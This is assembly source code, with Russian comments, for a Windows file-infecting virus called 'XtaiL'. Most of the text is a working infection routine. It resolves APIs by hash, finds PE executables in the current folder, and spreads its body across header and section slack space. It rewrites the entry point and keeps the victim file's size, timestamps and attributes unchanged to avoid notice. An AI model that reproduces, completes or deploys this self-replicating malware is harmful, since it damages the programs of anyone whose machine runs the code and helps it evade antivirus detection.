;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                              ;
;                                                                              ;
;       ####### #######                                                        ;
;       ####### #######                                                        ;
;            ## ##                                          ##                 ;
;            ## ##         ##          #####    ########    ##                 ;
;            ## ##         ##         ##  ##    ########    ##                 ;
;            ## ##         ##        ##   ##       ##       ##                 ;
;            ## ##      #######      ##   ##       ##       ##                 ;
;            ## ##      #######      #######       ##       ##                 ;
;            ## ##         ##        #######       ##       ##    ###          ;
;            ## ##         ##        ##   ##       ##       ##     ##          ;
;       ####### #######    #####     ##   ##    ########    #########          ;
;       ####### #######    #####    ###   ##    ########    #########          ;
;                                                                              ;
;                                                                              ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                              ;
;                                  :)                                          ;
;                                                                              ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                              ;
;                                                                              ;
;				ВИРУС XtaiL                                    ;
;                                                                              ;
;				   ТЕМЫ:                                       ;
;                                                                              ;
;(+) Поиск адреса Kernel32 (через SEH)                                         ;
;(+) Поиск адресов апишек по хешам					       ;
;(+) Инфекция РЕ-файлов (*.exe)                                                ;
;(+) Не изменяется время последней модификации файла                           ;
;(+) Не изменяется размер файла                                                ;
;(+) Полезная нагрузка: (1) вызов мессаги                                      ;
;(+) Не изменяются атрибуты файла                                              ;                             
;                                                                              ;
;(-) Перебивается точка входа, из-за чего могут вонять антивири                ;
;                                                                              ;
;(Х) Прошел проверку на ОС Windows XP SP2, на других не тестил.                ;
;                                                                              ;
;				 Версия 1.0                                    ;
;                                                                              ;
;                                                                              ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                              ;
;                                                                              ;
;                                                                              ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                              ;
;                                                                              ;
;				 ДОПОЛНЕНИЕ:                                   ;
;                                                                              ;
;                                                                              ;
;1) инфект файлов происходит ТОЛЬКО в текущей папке.                           ;
;2) Данный вирус инфектит файлы методом размазывания своего кода в заголовке,  ;
;а также в хвостах секций, где расположены одни нули. Код внедряется либо весь ;
;в заголовок (если там есть место), либо в заголовок внедряется только         ;
;загрузчик, а отальной код (тело) записывается в хвостах секций. В случае,     ;
;если не хватает места в заголовке даже для лоадера, то капец. Если в хвостах  ;
;секций не набирается нужного свободного места - то снова звиздец. Иначе - все ;
;отлично:)!                                                                    ;
;3) Почти все используемые переменные находятся в стеке.                       ;
;                                                                              ;
;                                                                              ;
;				     ЕЩЁ:                                      ;
;                                                                              ;
;Вирус был написан в целях саморазвития:)                                      ;
;                                                                              ;
;Как вариант можно внедриться в кодовую секцию, а ее часть разбросать по       ;
;хвостам секций.                                                               ;
;                                                                              ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                              ;
;                                                                              ;
;                                                                              ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;Большое спасибо Bill/TPOC, Sl0n'у, Z0mbie за их исходники, статьи, которыми я ;
;пользовался для своего саморазвития, также спасибо www.wasm.ru и              ;
;Крису Касперски, а также всем другим людям, которые писали и пишут отличные,  ;        
;полезные, интересные статьи(книги:) и т.п.:)                                  ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;






                                                                           
									;m1x

								;pr0mix@mail.ru
.386
.model flat, stdcall
option casemap:none

include windows.inc;\masm32\include\windows.inc
include kernel32.inc;\masm32\include\kernel32.inc
includelib kernel32.lib;\masm32\lib\kernel32.lib

.code
start:
	assume	fs:flat
	jmp	_01_
	szVNA			db 'XtaiL by m1x',0     	;Virus Name & Autor

;==============================================================================			                           
;вспомогательные переменные
;==============================================================================

;==============================================================================

;------------------------------------------------------------------------------

pushz	macro szText:VARARG             			;макрос для создания строки
	local	l1                                              ;и получения в стеке ее адреса
	call	l1                                              ;в общем, как всегда - все смотрим в исходник + отладчик:)!
	db	szText,0
l1:
endm

;------------------------------------------------------------------------------

UnInitData:                                                     ;неинициализированные структуры
dwGen		dd 00h                                          ;поколение
szGen		db 11 dup(00h)                                  ;поколение, только в строчном варике
dwLen	equ	$-szGen                                         ;длина данной строки
;------------------------------------------------------------------------------

InitData:                                                       ;инициализированные данные	
	dwAddrTableLoad		equ	dword ptr [ebp+4*1]     ;адрес _table_ (из загрузчика(LOADER))
	delta			equ	dword ptr [ebp]         ;хдесь хранится дельта-смещение
;------------------------------------------------------------------------------
Func1:                                                          ;здесь будут храниться адреса нужных апишек
	_fCreateFileA		equ	dword ptr [ebp-4*4]     ;смотри по названиям:)
	_fCreateFileMappingA	equ	dword ptr [ebp-4*5]
	_fMapViewOfFile   	equ	dword ptr [ebp-4*6]
	_fUnmapViewOfFile  	equ	dword ptr [ebp-4*7]
	_fCloseHandle     	equ	dword ptr [ebp-4*8]
	_fFindFirstFileA   	equ	dword ptr [ebp-4*9]
	_fFindNextFileA      	equ	dword ptr [ebp-4*10]
	_fSetFileAttributesA  	equ	dword ptr [ebp-4*11]
	_fGetCurrentDirectoryA	equ	dword ptr [ebp-4*12]
	_fLoadLibraryA       	equ	dword ptr [ebp-4*13]
	_fGetProcAddress     	equ	dword ptr [ebp-4*14]
	_fSetFileTime     	equ	dword ptr [ebp-4*15]
	_fVirtualProtect	equ	dword ptr [ebp-4*16]
	_fMessageBoxA		equ	dword ptr [ebp-4*17]
;------------------------------------------------------------------------------
	                                                 	;18 - hFindFile
	                                                 	;20 - ret address
	                                                 	;19 - dwOEP	                                                 	
	                                                 	;21 - eax	                                                 	
	                                                 	;22 - esi
;------------------------------------------------------------------------------
        pGen			equ	dword ptr [ebp-4*23]    ;address dwGen
	pushGen			equ	dword ptr [ebp-4*24]    ;Generation (dwGen)
	pExe			equ	dword ptr [ebp-4*25]    ;mapped address
	pSizeOfImage		equ	dword ptr [ebp-4*26]    ;адрес SizeOfImage
	Base			equ	dword ptr [ebp-4*27]    ;ImageBase
	SA			equ	dword ptr [ebp-4*28]    ;SectionAlignment
	pSizeOfHeaders		equ	dword ptr [ebp-4*29]    ;address SizeOfHeaders
	pEP			equ	dword ptr [ebp-4*30]    ;address AddressOfEntryPoint
	pBaseOfCode		equ	dword ptr [ebp-4*31]    ;address BaseOfCode
	MinOffset		equ	dword ptr [ebp-4*32]    ;PointerToRawData самой первой секции из таблицы секций
	OstVirSize		equ	dword ptr [ebp-4*33]    ;остаток незаписанных байт вирька
	SizeOfLoader		equ	dword ptr [ebp-4*34]    ;size of LOADER

;ж=============================================================================

;+-----------------------------------------------------------------------------

HashTable1:							; Таблица хешей Kernel32
	dd	0860b38bch          				;CreateFileA
	dd	01F394C74h					;CreateFileMappingA
	dd	0FC6FB9EAh       				;MapViewOfFile
	dd	0CA036058h       				;UnmapViewOfFile
	dd	0F867A91Eh       				;CloseHandle
	dd	03165E506h       				;FindFirstFileA
	dd	0CA920AD8h       				;FindNextFileA
	dd	0152DC5D4h    					;SetFileAttributesA
	dd	02F597DD6h       				;GetCurrentDirectoryA
	dd	071E40722h       				;LoadLibraryA
	dd	05D7574B6h 					;GetProcAddress
	dd	0a2d2cb0ch					;SetFileTime
	dd	015f8ef80h					;VirtualProtect
	dw	0ffffh                                          ;конец таблички хешей:)

;------------------------------------------------------------------------------




;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Функция LOADER (загрузчик)
;сборка тела вирька и передача на него управления
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

LOADER:
	call	_deltaLoad_                                     ;int 2ch
_deltaLoad_:
	pop	ebp
	lea	eax,[ebp+(_table_-_deltaLoad_)]          	;адрес на табличку хранения адресов и размеров кусков тельца
	mov	ebx,eax
	movzx	ecx,byte ptr [eax]                              ;в есх - количество пар (пара = адрес и размер очередного куска) 
	mov	edi,12345678h;_address_konca_posledney_section_ ;в edi - адрес места, где собирать тело воедино 
	                                                        ;по-дефолту - это адрес конца последней секции
	dwAddr	=dword ptr $-4
	push	edi                                             ;сохраняем этот адрес
	inc	eax

_nextrecord_:
	push	ecx                                             ;сохраняем есх (кол-во пар)
	mov	esi,dword ptr [eax]                             ;в esi - адрес очередного куска нашего вирька в файле
	movzx	ecx,word ptr [eax+4]                            ;в есх - размер этого куска
	rep	movsb	                                        ;и переносим этот кусок в заранее подготовленное место
	pop	ecx                                             ;вытаскиваем из стека есх
	add	eax,6;8                                         ;передвигаемся к следующей паре
	loop	_nextrecord_                                    ;и повторяем все до тех пор, пока кол-во пар!=0
	ret							;вытаскиваем адрес 
		                                             	;и передаем управление на уже собранный вирек:)!		                                             	
SizeT1	equ $-LOADER                                            ;размер самого загрузчика

;==============================================================================
;далее идет 
;табличка адресов и размеров 
;заполняется во время внедрения вирька
;будет иметь следующий вид:
;	db	xxh		;+количество элементов в табличке: (элемент = 6 байт(адрес+его размер))     
	                                                    
;	dd	xxxxxxxxh	;+адрес очередного пятна(куска тела вирька)
;	dw	xxxxh		;+размер данного пятна
;	dd	xxxxxxxxh 	; тоже самое
;	dw	xxxxh 		; тоже самое:)!

;Размер _table_ = 1 + 6*кол-во_элементов_в_табличке
;А размер всего загрузчика = SizeT1 + size _table_

;==============================================================================
_table_:

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Конец функции LOADER
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx




;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Функция Play
;вызов мессаги бокса c Respect-ом и подсчетом поколения:)
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Play:
;#######################BEG перевод числа в строку#############################
	lea	esi,dwGen
	add	esi,delta
	lodsd                                                   ;в eax - исходное число
	lea	edi,szGen+dwLen-2     				;с учетом завершающего нуль-символа
	add	edi,delta                                       ;edi - указывает на конец строки
	push	10
	pop	esi                                             ;esi - делитель
_itoa_:
	xor	edx,edx                                         ;обнуляем edx
	div	esi                                             ;делим
	add	dl,'0'                                          ;в edx - остаток; + '0'
	mov	byte ptr [edi],dl                               ;и запишем полученный символ в буфер
	dec	edi                                             ;корректируем edi
	test	eax,eax                                         ;все ли цифры переведены в символы?
	jnz	_itoa_
	inc	edi                                             ;edi - указывает на начало полученной строки
;#######################END перевод числа в строку#############################
	push	eax
	pushz	"VX RULEZ!"
	push	edi;dword ptr [esp]
	push	eax
	call	_fMessageBoxA                                   ;и светим мессагу:)!
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Конец функции Play
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx




;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Функция InfectFiles
;инфект exe-шек (РЕ-файликов) методом записи загрузчика в заголовок, а вирька 
;в хвосты секций или же записи всего вирька сразу в заголовок(если есть место:)!
;Вход:
;edi - путь к жертве (пример: "C:\Games\Sacrifice.exe")
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
InfectFiles:
	push	eax                                             ;
	push	esi
	xor	ebx,ebx                            		;
;------------------------------------------------------------------------------
	push	FILE_ATTRIBUTE_NORMAL
	push	edi
	call	_fSetFileAttributesA                            ;ставим новые атрибуты(необходимые для инфекта)
;------------------------------------------------------------------------------
	call	fOpenFile                                       ;вызываем функцию открытия файла
	inc	eax
	je	_error0_                                        ;неудачно?
;------------------------------------------------------------------------------
	dec	eax
	push	eax						;иначе сохраняем хэндл файла
;------------------------------------------------------------------------------	
	push	ebx
	push	ebx
	push	ebx
	push	PAGE_READWRITE
	push	ebx
	push	eax						;push	dword ptr [esp+20]
	call	_fCreateFileMappingA                            ;создаем проекцию файла
	test	eax,eax
	jne	_next2_

	call	_fCloseHandle                                   ;если неудачно, 
	jmp	_error0_                                        ;то закрываем хэндл
;------------------------------------------------------------------------------
_next2_:
	push	eax						;иначе сохраняем хэндл проекции

	push	ebx
	push	ebx
	push	ebx
	push	FILE_MAP_ALL_ACCESS
	push	eax
	call	_fMapViewOfFile                                 ;мэппинг файла
	xchg	edi,eax

	call	_fCloseHandle                                   ;закрываем открытые хэндлы
	call	_fCloseHandle                                   ;хэндлы уже в стеке

	xchg	eax,edi
	test	eax,eax
	je	_error0_                                        ;если мэппинг не получился - на выход
;------------------------------------------------------------------------------
        lea	esi,dwGen                                       ;здесь мы сохраняем текущее поколение(число)
        add	esi,delta
        push	esi
        push	dword ptr [esi]
        inc	dword ptr [esi]                                 ;и для жертвы естесно его увеличиваем +1
;------------------------------------------------------------------------------
	
	push	eax						;иначе сохраняем базу мэппинга (pExe)
	call	ValidPE                                         ;проверяем файл на валидность (РЕ-файл?)
	test	ebx,ebx
	je	_error1_                                        ;если нет, то на выход

	cmp	word ptr [eax+3Ah],'0x'                         ;заражен ли уже этот файл нашим вирьком?
	je	_error1_                                        ;если да, то на выход
;------------------------------------------------------------------------------
	xchg	esi,eax						;mapped address:)!
	assume	esi:ptr IMAGE_DOS_HEADER                        ;дос-заголовок
	add	esi,[esi].e_lfanew
	lodsd
	assume	esi:ptr IMAGE_FILE_HEADER                       ;файловый заголовок
	movzx	ecx,[esi].NumberOfSections                      ;в есх - количество секций в файле
	test	ecx,ecx                                         ;если ноль(0), то капец
	je	_error1_
	add	esi,sizeof IMAGE_FILE_HEADER
	assume	esi:ptr IMAGE_OPTIONAL_HEADER                   ;опциональный заголовок
	lea	eax,[esi].SizeOfImage
	push	eax						;save pSizeOfImage

	push	[esi].ImageBase                 		;save ImageBase (Base)

	mov	eax,dword ptr [ebp-4*21]        		;dwOEP+delta

	mov	ebx,[esi].ImageBase                             ;считаем OEP(оригинальную точку входа)
	add	ebx,[esi].AddressOfEntryPoint
	push	ebx                                             ;и ставим угу
	pop	dword ptr [eax]

	push	[esi].SectionAlignment				;save SectionAlignment (SA)
	lea	eax,[esi].SizeOfHeaders
	push	eax						;save pSizeOfHeaders
	lea	eax,[esi].AddressOfEntryPoint
	push	eax                             		;save pEP
	lea	eax,[esi].BaseOfCode
	push	eax                                             ;save pBaseOfCode
	add	esi,sizeof IMAGE_OPTIONAL_HEADER
	assume	esi:ptr IMAGE_SECTION_HEADER
	push	[esi].PointerToRawData				;save PointerToRawData 1 section(first) (MinOffset)

	push	VirusSize					;кладем в стэк кол-во незаписанных байт нашего вирька (изначально это VirusSize) 

	mov	edi,pExe;+12					;edi - mapped address
	std                                                     ;переключаем флаг направления
;------------------------------------------------------------------------------
                                                                ;далее вычисляем полный размер загрузчика(размер з-ка + размер таблички(_table_))
		                                         	;т.к. мы пока не знаем, сколько пар (адрес+размер) будет в табличке(размер таблички пока неизвестен), то тогда
	                                                        ;возьмем за кол-во пар число секций в файле(ecx) - ясное дело, что больше быть не может:)
	imul	edx,ecx,6;8           				;умножаем на 6 (размер пары)                          
	db	83h,0c2h
	db	SizeT1+1                                        ;add edx,SizeT1+1
	;add	edx,SizeT1+1;eax                                ;прибавляем к edx размер самого загрузчика
	                                             		;и увеличиваем edx на 1
	                                             		;(это byte - будет записано кол-во пар)	
        push	edx                                   		;save size LOADER:)!

        xor	eax,eax                                         ;обнуляем еах

;------------------------------------------------------------------------------
	push	edi                                             ;сохраняем в стеке edi (mapped address)
	add	edi,[esi].PointerToRawData			;прибавляем к edi физ. смещение самой первой секции в таблице секций
	dec	edi                                             ;вычитаем 1
	mov	edx,edi                                         ;save edi in edx
	scasb                                                   ;и узнаем, есть ли нули до первой секции
	je	$-1                                             ;если есть, то сравниваем дальше
	add	edi,16                                          ;после этого прибавляем к edi 16(10h) - на всякий случай (некотрые линкеры просят тут нули?)
	sub	edx,edi	                                        ;и узнаем кол-во пустых байт(нулей), в которые можно записаться

	xchg	ebx,edi;mov

	pop	edi
	cmp	edx,SizeOfLoader                                ;смотрим, влезает ли загрузчик в этот промежуток
	jl	_error1_;_pushzero0_                            ;если нет, то капец - на выход быстро!
;------------------------------------------------------------------------------

	                                             		;(для записи xor ebx,ebx прибавляем +2)
	cmp	edx,VirusSize+2                                 ;на этот раз смотрим, влезет ли все тело вирька в данный пустой промежуток(заголовок)
	jl	_nextinfo_                                      ;если нет, то будем искать место для вирька в хвостах секций
	mov	edi,ebx                                         ;если же да, то тогда нафиг все остальные проверки, и запишем всего вирька в заголовке:)
	cld
	lea	esi,start
	add	esi,delta
	mov	ecx,VirusSize
	mov	ax,0db33h                                       ;сначала пишем xor ebx,ebx
	stosw
	rep	movsb                                           ;и уже после делаем свое классное дело:)!
	xchg	edi,ebx
	jmp	_virHeaderOK_                                   ;после записи передаем управление на финальнуйю часть
;------------------------------------------------------------------------------
_nextinfo_:	                                                ;
        xor	ebx,ebx                                         ;обнуляем ebx
;xxxxxxxxxxxxxxxxxxBEG получение свободных байт в хвостах секцийxxxxxxxxxxxxxxx
_cycle_:                                                        ;далее двигаемся по секциям
	cmp	[esi].SizeOfRawData,0                           ;если физический размер секции=0, то в стэк кладем 0 (0 пустых байт)
	je	_xor0_
	push	edi
	add	edi,[esi].PointerToRawData                      ;находим конец очередной секции
	add	edi,[esi].SizeOfRawData
	dec	edi
	mov	edx,edi
	scasb                                                   ;и считаем кол-во нулей(свободного места)
	je	$-1
	add	edi,16                                          ;также прибавляем к edi 16
	sub	edx,edi                                         ;в edx - размер свободного места
	pop	edi
	cmp	edx,1                                           ;если же он меньше 1, то
	jge	_l1_
_xor0_:
	xor	edx,edx                                         ;в стэк кладем ноль(ноль байт свободного места)
_l1_:
	push	edx   						;в стэк кладем размер свободного места(ноль или некоторое (+) число:) 
	add	ebx,edx                         		;в ebx - общий размер свободного места в файле
	add	esi,sizeof IMAGE_SECTION_HEADER                 ;переходим к следующей секции
	loop	_cycle_                                         ;ументшаем счетчик числа секций
;xxxxxxxxxxxxxxxxxxEND получение свободных байт в хвостах секцийxxxxxxxxxxxxxxx

;xxxxxxxxxxxxxxxxxxxBEG Правка заголовка последней секцииxxxxxxxxxxxxxxxxxxxxxx
	cmp	ebx,VirusSize;SizeOfLoader			;если общий размер свободного места в файле меньше размера 
                                                                ;нашего вирька, то капут - на выход, товарищи
	jl	_error1_
								;иначе, в еdх - размер свободного места в конце последней секции
	sub	esi,sizeof IMAGE_SECTION_HEADER                 ;esi - указывает на заголовок последней секции
	mov	eax,[esi].Misc.VirtualSize                      ;в еах - виртуальный размер последней секции
	add	eax,VirusSize;SizeOfLoader               	;прибавляем размер вирька
	add	eax,edx;или lea                          	;и прибавляем еdх (т.к. в этой секции помимо ее кода будет записан и кусок нашего вирька:)
	                                                        ;тем самым еах содержит полный размер секции с размером куска нашего зверька
	mov	ebx,SA                                          ;и выравниваем еах на SectionAlignment
	dec	ebx                                             ;((x+(y-1))&(~(y-1)))
	add	eax,ebx                                         ;где х - размер,
	not	ebx                                             ;а   у - выравнивающий фактор
	and	eax,ebx                                         ;
	mov	ecx,Base                                        ;в ecx - базовый адрес загрузки образа
	add	ecx,[esi].VirtualAddress                        ;прибавляем VirtualAddress
	add	ecx,[esi].Misc.VirtualSize                      ;+ VirtualSize
	add	ecx,edx                                         ;+ edx - тем самым edi теперь указывает на конец последней секции (в памяти)
	                                                        ;именно в этом месте(куда указывает edi) и будет загрузчик собирать воедино куски нашего зверька:)!
	lea	ebx,dwAddr
	add	ebx,delta
	mov	dword ptr [ebx],ecx                             ;запишем в загрузчик этот адрес
	mov	[esi].Misc.VirtualSize,eax                      ;сделаем новый виртуальный размер
	add	eax,[esi].VirtualAddress
	mov	edx,pSizeOfImage                                ;в edx - адрес SizeOfImage
	mov	dword ptr [edx],eax                             ;а также вычислим новый размер SizeOfImage(=VirAddr+Virsize последней секции:)			
	or	byte ptr [esi+24h+3h],80h                       ;IMAGE_SCN_MEM_WRITE - естественно надо добавить к хар-кам атрибут "для записи"
;xxxxxxxxxxxxxxxxxxxEND Правка заголовка последней секцииxxxxxxxxxxxxxxxxxxxxxx	

;xxxxxxxxxxxxxxxxxxxxxxxBEG Внедрение в хвосты секцийxxxxxxxxxxxxxxxxxxxxxxxxxx
        lea	edx,dword ptr [esi+sizeof IMAGE_SECTION_HEADER] ;+28h(40 byte)
	assume	edx:ptr IMAGE_SECTION_HEADER
	lea	esi,_end_-1                                     ;esi - указывает на конец нашего зверька
	add	esi,delta                                       ;будем записывать код с конца и строить табличку для лоадера тоже с конца                                             
	                                                        
	xor	ebx,ebx
	                                                        ;обнуляем ebx - в нем будет хранится кол-во записанных кусков нашего зверька(пар)
	                                                        ;это и будет кол-во пар(пара=адрес куска + размер куска)
	lea	eax,[edi-7]
	;mov	eax,edi
	add	eax,MinOffset
	;sub	eax,7;5                                         ;в еах - адрес, по которому будем записывать загрузчик с табличкой(сначала табличку(задом наперед), 
	                                                        ;а после и сам загрузчик:)
_cycle2_:
	sub	edx,sizeof IMAGE_SECTION_HEADER                 ;edx - указывает на последний заголовок в таблице секций:)
	pop	ecx                                             ;вытаскиваем из стека ранее сохраненные размеры пустых(нулевых) мест в хвостах секций(концах)                                         
	jecxz	_cycle2_                                        ;если размер=0, то переходим к следующему заголовку секции
	cmp	ecx,OstVirSize                                  ;иначе, проверяем этот размер с размером оставшихся незаписанных байт
	jle	_nextcycle2_                                    ;если есх оказался больше, то
	mov	ecx,OstVirSize	                                ;есх делаем равным OstVirSize

_nextcycle2_:
	sub	OstVirSize,ecx                                  ;вычитаем из остатка есх
	push	edi
	push	ecx                                             ;save size spot(размер пятна)
	add	edi,[edx].PointerToRawData                      ;в edi - физический адрес конца очередной секции (физический потому, что мы будем записывать в файл!)
	add	edi,[edx].SizeOfRawData
	dec	edi
	rep	movsb                                       	;и записываем очередное пятно (кусок)
	inc	edi                                             ;к edi +1
	sub	edi,pExe                                        ;затем вычитаем базу мэппинга 
	sub	edi,[edx].PointerToRawData                      ;и - физический адрес секции
	add	edi,Base                                        ;и + ImageBase
	add	edi,[edx].VirtualAddress                        ;и + виртуальный адрес секции(мы его запишем в нашу табличку, а виртуальные все потому, что собирать будем не в файле, а в памяти!)
	cmp	[edx].Misc.VirtualSize,0                        ;если виртуальный размер=0, то, чтобы не было косяков
	jne	_nozero_
	inc	[edx].Misc.VirtualSize                          ;прибавляем к нему 1

_nozero_:
	mov	ecx,SA                                          ;и выравниваем виртуальный размер на SectionAlignment,
	                                                        ;тем самым подтягивая его+вирт. адрес к вирт. адресу следующей секции
	dec	ecx
	add	[edx].Misc.VirtualSize,ecx
	not	ecx
	and	[edx].Misc.VirtualSize,ecx
	test	byte ptr [edx+24h+3h],10h                       ;если секция "общая"  для других процессов, то 
	je	_ch0_                                           
	xor	byte ptr [edx+24h+3h],10h                       ;сбрасываем этот флаг
_ch0_:
	test	byte ptr [edx+24h+3h],02h                       ;если секция выгружаемая, то
	je	_ch1_
	xor	byte ptr [edx+24h+3h],02h                       ;сбрасываем этот флаг
_ch1_:
	or	byte ptr [edx+24h+3h],40h                       ;а также устанавливаем флаг "для чтения"
;xxxxxxxxxxxxxxxxxxxxBEG Построение таблички для лоадераxxxxxxxxxxxxxxxxxxxxxxx
	xchg	edi,eax                         		;в edi - адрес, по которому будем записывать сначала табличку(задом наперед), 
	                                                        ;а потом и сам загрузчик
	cld                                                     ;сбрасываем флаг направления для корректной записи таблички
	                                         		;в еах - размер записанного куска нашего вирька
	stosd                                                   ;и пишем:)
	pop	eax                                             ;в еах - адрес в памяти записанного куска нашего вирька                         		
	stosw                                                   ;пишем:)
	lea	eax,[edi-12]
	;sub	edi,12                                        	;вичитаем из edi 12(тем самым переходим по адресу, где будет записана следующая пара(адрес+размер))
	std                                                     ;устанавливаем флаг направления для записи кусков нашего вирька задом с конца (в начало:)
	;xchg	eax,edi                                         ;сохраняем адрес в еах
	pop	edi

	inc	ebx                                             ;увеличиваем кол-во записанных кусков(пятен) на +1
	cmp	OstVirSize,0                                    ;смотрим, весь ли зверек записан в жертву, если нет - то 
	jne	_cycle2_                                        ;продолжаем дальше записывать:)!

	lea	edi,[eax+6-1]
	;xchg	eax,edi                                         ;в edi - адрес
	;add	edi,6-1;5 byte:)!
	cld                                                     ;!
	xchg	eax,ebx;mov                             	;в еах - кол-во записанных кусков вирька
	stosb                                                   ;и записываем
	dec	edi
	dec	edi                                             ;корректируем адрес                                       
;xxxxxxxxxxxxxxxxxxxxEND Построение таблички для лоадераxxxxxxxxxxxxxxxxxxxxxxx

;xxxxxxxxxxxxxxxxxxxxxxxxBEG Внедрение самого лоадераxxxxxxxxxxxxxxxxxxxxxxxxxx
	std                                                     ;!
	lea	esi,_table_-1                           	;устанавливаем esi на конец загрузчика(на начало _table_)
	add	esi,delta
	db	6ah
pusharg	db	SizeT1
	pop	ecx
	rep	movsb                                           ;и теперь (после записи всей таблички) записываем (наконец-то) сам загрузчик:)!
	cld                                                     ;!
	inc	edi                                             ;переводим edi на начало уже полностью записанного загрузчика(вместе с табличкой:)!
;xxxxxxxxxxxxxxxxxxxxxxxxEND Внедрение самого лоадераxxxxxxxxxxxxxxxxxxxxxxxxxx
;xxxxxxxxxxxxxxxxxxxxxxxEND Внедрение в хвосты секцийxxxxxxxxxxxxxxxxxxxxxxxxxx
_virHeaderOK_:
	xchg	eax,edi
	mov	edi,pEP
	mov	esi,pExe
	sub	eax,esi;pExe                        		
	stosd                                                   ;перебиваем AddressOfEntryPoint на адрес нашего загрузчика:)!
	mov	edi,pBaseOfCode                                 ;чтобы Олька не воняла
	stosd                                  ;!!!!!!!
	mov	word ptr [esi+3Ah],'0x';eax            		;ставим метку заражения
	mov	edi,pSizeOfHeaders                              ;и подтягиваем SizeOfHeaders к PointerToRawData первой секции
	mov	eax,MinOffset                                   ;(SizeOfHeaders=PointerToRawData)
	stosd

;------------------------------------------------------------------------------
_error1_:
	cld
	push	pExe
	call	_fUnmapViewOfFile                               ;выгружаем 
;------------------------------------------------------------------------------
	mov	edi,pGen                                        ;восстанавливаем текущее поколение(число)
	mov	eax,pushGen
	stosd

;------------------------------------------------------------------------------
_error0_:
	lea	edi,[ebp+4*2+2ch];wfd.cFileName

	xor	ebx,ebx
	call	fOpenFile
	inc	eax
	je	_endinfect_
	dec	eax
;------------------------------------------------------------------------------	
	push	eax                              		;в стек кладем хэндл файла                

	lea	esi,[ebp+4*2+14h];wfd.ftLastWriteTime
	push	esi
	push	ebx
	push	ebx
	push	eax
	call	_fSetFileTime                                   ;ставим старое время последней модификации жертвы(восстанавливаем)

	call	_fCloseHandle                                   ;закрываем хэндл
;------------------------------------------------------------------------------
_endinfect_:
	push	dword ptr [ebp+4*2];wfd.dwFileAttributes
	push	edi
	call	_fSetFileAttributesA                            ;восстанавливаем старые атрибуты файла

	mov	esi,dword ptr [ebp-4*22]
	mov	eax,dword ptr [ebp-4*21]                        ;and eax
	lea	esp,dword ptr [ebp-4*20]                        ;and stack
	ret                                                     ;выходим:)!

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Конец функции InfectFiles
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
	




;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Функция fOpenFile
;Открытие файла на чтение-запись
;Вход:
;edi - путь (имя) к файлу
;ebx - ноль (0)
;Выход:
;еах - возвращенное значение
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
fOpenFile:
	push	ebx
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	ebx
	push	FILE_SHARE_READ+FILE_SHARE_WRITE
	push	GENERIC_READ+GENERIC_WRITE
	push	edi
	call	_fCreateFileA                                   ;открываем снова жертву (данный файл)
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;Конец функции fOpenFile
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx




